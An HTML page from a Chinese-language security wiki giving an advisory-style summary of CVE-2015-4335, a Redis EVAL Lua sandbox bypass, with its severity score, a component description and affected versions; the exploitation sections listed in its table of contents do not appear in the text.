<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
    <title>CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞 | Tahir&#39;s Wiki</title>
    
    
        <meta name="keywords" content="Redis">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="漏洞信息漏洞简介 漏洞名称：Redis EVAL Lua沙箱绕过漏洞 漏洞编号：CVE-2015-4335 漏洞类型：代码注入 CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】 漏洞危害等级：高危  组件概述​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞">
<meta property="og:url" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Tahir&#39;s Wiki">
<meta property="og:description" content="漏洞信息漏洞简介 漏洞名称：Redis EVAL Lua沙箱绕过漏洞 漏洞编号：CVE-2015-4335 漏洞类型：代码注入 CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】 漏洞危害等级：高危  组件概述​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/23.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/7.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/8.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/9.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/12.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/22.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/4.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/5.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/6.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/13.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/14.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/15.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/16.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/17.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/18.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/19.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/20.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/11.png">
<meta property="og:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png">
<meta property="article:published_time" content="2021-07-06T08:21:23.000Z">
<meta property="article:modified_time" content="2021-07-06T08:46:19.854Z">
<meta property="article:author" content="Tahir">
<meta property="article:tag" content="Redis">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/23.png">
    

    
        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
    

    
        <link rel="icon" href="/favicon.ico">
    

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/libs/open-sans/styles.css">

    
<link rel="stylesheet" href="/libs/source-code-pro/styles.css">


    
<link rel="stylesheet" href="/css/style.css">

    
<script src="/libs/jquery/2.1.3/jquery.min.js"></script>

    
<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>

    
    
        
<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">

    
    
        
<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">

    
    
    
    


    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Tahir&#39;s Wiki</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/">首页</a>
                
                    <a class="main-nav-link" href="/archives">归档</a>
                
                    <a class="main-nav-link" href="/categories">分类</a>
                
                    <a class="main-nav-link" href="/tags">标签</a>
                
                    <a class="main-nav-link" href="/about">关于</a>
                
            </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something...">
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/">首页</a></td>
                
                    <td><a class="main-nav-link" href="/archives">归档</a></td>
                
                    <td><a class="main-nav-link" href="/categories">分类</a></td>
                
                    <td><a class="main-nav-link" href="/tags">标签</a></td>
                
                    <td><a class="main-nav-link" href="/about">关于</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
            
                <aside id="sidebar">
   
        
    <div class="widget-wrap" id="categories">
        <h3 class="widget-title">
            <span>categories</span>
            &nbsp;
            <a id="allExpand" href="#">
                <i class="fa fa-angle-double-down fa-2x"></i>
            </a>
        </h3>
        
        
        
         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            威胁猎捕
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Cobalt Strike
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            数据库安全
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Oracle Database
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            SQL Server
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            漏洞相关
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            MSSQL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            OpenSSL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            Redis
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file active"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
    </div>
    <script>
        $(document).ready(function() {
            var iconFolderOpenClass  = 'fa-folder-open';
            var iconFolderCloseClass = 'fa-folder';
            var iconAllExpandClass = 'fa-angle-double-down';
            var iconAllPackClass = 'fa-angle-double-up';
            // Handle directory-tree expansion:
            // 左键单独展开目录
            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
                event.preventDefault();

                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var subtree = $(this).siblings('ul');
                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if (expanded) {
                    if (typeof subtree != 'undefined') {
                        subtree.slideUp({ duration: 100 });
                    }
                    icon.addClass(iconFolderCloseClass);
                } else {
                    if (typeof subtree != 'undefined') {
                        subtree.slideDown({ duration: 100 });
                    }
                    icon.addClass(iconFolderOpenClass);
                }
            });
            // 右键展开下属所有目录
            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var listNode = $(this).siblings('ul');
                var subtrees = $.merge(listNode.find('li ul'), listNode);
                var icons = $.merge(listNode.find('.fa'), icon);
                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if(expanded) {
                    subtrees.slideUp({ duration: 100 });
                    icons.addClass(iconFolderCloseClass);
                } else {
                    subtrees.slideDown({ duration: 100 });
                    icons.addClass(iconFolderOpenClass);
                }
            })
            // 展开关闭所有目录按钮
            $(document).on('click', '#allExpand', function (event) {
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconAllExpandClass);
                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
                if(expanded) {
                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
                    $('#categories li ul').slideDown({ duration: 100 });
                    icon.addClass(iconAllPackClass);
                } else {
                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
                    $('#categories li ul').slideUp({ duration: 100 });
                    icon.addClass(iconAllExpandClass);
                }
            });  
        });
    </script>

    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>
            
            <section id="main"><article id="post-漏洞相关/Redis/CVE-2015-4335-Redis-EVAL-Lua沙箱绕过漏洞" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        
            <header class="article-header">
                
                    <div class="article-meta">
                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/">漏洞相关</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/">Redis</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/Redis/" rel="tag">Redis</a>
    </div>

                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">
            <time datetime="2021-07-06T08:21:23.000Z" itemprop="datePublished">2021-07-06</time>
        </a>
    </div>


                        
                            <i class="fa fa-bar-chart"></i>
                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
                        
                        
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/漏洞相关/Redis/CVE-2015-4335-Redis-EVAL-Lua沙箱绕过漏洞.md"> Source </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/漏洞相关/Redis/CVE-2015-4335-Redis-EVAL-Lua沙箱绕过漏洞.md"> Edit </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/漏洞相关/Redis/CVE-2015-4335-Redis-EVAL-Lua沙箱绕过漏洞.md"> History </a>
                            </div>
                        
                    </div>
                
                
    
        <h1 class="article-title" itemprop="name">
            CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞
        </h1>
    

            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
        
            
                <div id="toc" class="toc-article">
                <strong class="toc-title">Catalogue</strong>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">漏洞信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E6%A6%82%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">组件概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">应用协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E8%83%8C%E6%99%AF"><span class="toc-number">3.1.</span> <span class="toc-text">技术背景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lua%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E2%80%93%E9%97%AD%E5%8C%85"><span class="toc-number">3.1.1.</span> <span class="toc-text">lua数据结构–闭包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">漏洞利用过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.3.</span> <span class="toc-text">补丁分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
                </div>
            
        
        
            <h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul>
<li>漏洞名称：Redis EVAL Lua沙箱绕过漏洞</li>
<li>漏洞编号：CVE-2015-4335</li>
<li>漏洞类型：代码注入</li>
<li>CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】</li>
<li>漏洞危害等级：高危</li>
</ul>
<h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
<p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:up to 2.8.20</p>
